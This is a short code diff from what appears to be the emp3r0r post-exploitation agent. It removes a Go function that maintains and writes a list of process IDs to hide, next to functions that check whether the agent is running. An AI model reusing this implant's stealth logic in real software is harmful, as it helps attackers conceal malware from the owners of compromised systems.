@@ -24,12 +24,6 @@ func CheckAgentProcess() *emp3r0r_data.AgentProcess {
 	return p
 }
 
-// UpdateHIDE_PIDS update HIDE PID list
-func UpdateHIDE_PIDS() error {
-	emp3r0r_data.HIDE_PIDS = util.RemoveDupsFromArray(emp3r0r_data.HIDE_PIDS)
-	return ioutil.WriteFile(emp3r0r_data.AgentRoot+"/emp3r0r_pids", []byte(strings.Join(emp3r0r_data.HIDE_PIDS, "\n")), 0600)
-}
-
 // IsAgentRunningPID is there any emp3r0r agent already running?
 func IsAgentRunningPID() (bool, int) {
 	defer func() {
